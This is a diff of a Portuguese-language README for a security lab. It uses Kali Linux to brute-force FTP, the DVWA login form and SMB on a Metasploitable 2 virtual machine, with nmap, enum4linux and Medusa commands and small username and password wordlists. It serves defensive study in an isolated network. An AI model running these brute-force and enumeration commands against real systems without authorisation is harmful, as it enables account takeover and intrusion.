@@ -1,11 +1,11 @@
-# 🔐 Auditoria de sistemas com Medusa - Laboratório de Força Bruta (Kali + Metasploitable 2 + DVWA)
+# 🔍 Auditoria de Segurança com Medusa - Laboratório de Força Bruta (Kali + Metasploitable 2 + DVWA)
 O objetivo deste projeto foi compreender as técnicas ofensivas e refletir sobre mitigação e boas práticas de segurança nos sistemas. Para isso, foi realizado, antes de tudo, a configuração de um ambiente controlado usando Kali Linux e Metasploitable 2, com foco na execução de ataques de força bruta utilizando a ferramenta Medusa.
 
 <br>
 
-# 1 - 🛠️ Ambiente:
+# 1 - 🛠️ Ambiente Utilizado:
 * VM Usada: VirtualBox;
-* SOs usadas: Kali Linux(atacante) e Metasploitable 2(Alvo);
+* SOs usadas: Kali Linux(Atacante) e Metasploitable 2(Alvo);
 * Explorações: FTP, DVWA, SMB;
 * Ferramentas Para a Exploração: Nmap, Medusa, SMBClient;
 * Configurando a placa de rede dentro da VM como: "Host-Only", tanto do Kali Linux quanto do Metaspoitable 2. <br>
@@ -17,7 +17,7 @@ O objetivo deste projeto foi compreender as técnicas ofensivas e refletir sobre
 - Verificação de ping entre os dois SOs; <br>
       └── Verifica se ambos estão se comunicando.
 
-- Para saber o ip e realizar a verificação do metasploitable 2: 
+- Digite o comando no metasploitable 2 para saber o ip e realizar a verificação do mesmo (Faça isso após entrar com o login e senha do metasploitable 2):
   ``` bash
   ip a
   ```
@@ -31,17 +31,17 @@ O objetivo deste projeto foi compreender as técnicas ofensivas e refletir sobre
       
 <br>
 
-## 🚪 Cenários de Ataques FTP:
- **Etapa 1: Escanear possiveis portas abertas e o tipo de serviço:**
+## 🚪 Cenário de Ataque no protocolo FTP:
+ * **Etapa 1: Escanear possiveis portas abertas e o tipo de serviço:**
    ```bash
    nmap -sV -p 21,22,80,445,139 coloque o IP
    ```
-* **Resultado da análise:** Acesso bem sucedido no `FTP` ✔
   <img width="1029" height="553" alt="image" src="https://github.com/user-attachments/assets/a6544b03-ac68-4690-962d-9654814ada3a" />
+  * **Resultado da análise:** Acesso bem `sucedido` ✔
 
 <br>
 
- **Etapa 2: Quebrando senhas com a ferramenta Medusa: Faça a criação de arquivos com possíveis nomes de usuários e senhas:**
+* **Etapa 2: Quebrando senhas com a ferramenta Medusa: Faça a criação de arquivos com possíveis nomes de usuários e senhas:**
  ```bash
 echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
 ```
@@ -49,11 +49,11 @@ echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
 ```bash
 echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
 ```
-* **Resultado da exploração:** Usuário e Login encontrados com sucesso! Podemos entrar acessar a conexão FTP com privilégios ✔
  <img width="1179" height="555" alt="image" src="https://github.com/user-attachments/assets/5a336aa4-5ce3-4112-b86f-c1d37de474d4" />
+ * **Resultado da exploração:** Usuário e Login encontrados com sucesso! Podemos entrar acessar a conexão FTP com privilégios ✔
 
 ## 📑 Cenários de Ataques em Formulários de Login:
-**Etapa 3: Entrar no site: DVWA**
+* **Etapa 3: Entrar no site: DVWA**
 ```bash
 192.168.56.102/dvwa/login.php
 ```
@@ -66,11 +66,21 @@ medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
 -m 'FAIL=Login failed' -t 6
 ```
 <img width="1251" height="607" alt="image" src="https://github.com/user-attachments/assets/2068f786-ab68-4490-82f5-79932d1fc090" />
-
-- **Resumo do comando: O comando faz brute force no login do DVWA via HTTP, usando listas de usuários e senhas, enviando requisições do tipo POST, identificando falhas pelo texto “Login failed” e executando tudo em 6 tentativas acontecendo ao mesmo tempo.**
+- **Resumo: O comando faz brute force no login do DVWA via HTTP, usando listas de usuários e senhas, enviando requisições do tipo POST, identificando falhas pelo texto “Login failed” e executando tudo em 6 tentativas acontecendo ao mesmo tempo.**
 
 ## 💻 Cenários de Ataques SMB:
+* **Etapa 4: Enumerar informações de sistemas Windows ou serviços SMB/Samba.**
+```bash
+enum4linux -a 192.168.56.102 | tee enum4_output.txt
+```
+* **Resultado da análise:** Acesso a listas de usuários, compartilhamentos disponiveis e até nome de dominio ✔
 
+* **Etapa 4.1: Ataque ao SMB com a medusa**
+```bash
+medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50 
+```
+<img width="1146" height="546" alt="image" src="https://github.com/user-attachments/assets/9b16f8ab-29c3-47b1-9ec8-af98c3ac33bb" />
+  
 ![](https://i.imgur.com/WTLoFrq.png)
 
 ## 🔗 Compartilhe com a comunidade 🧡
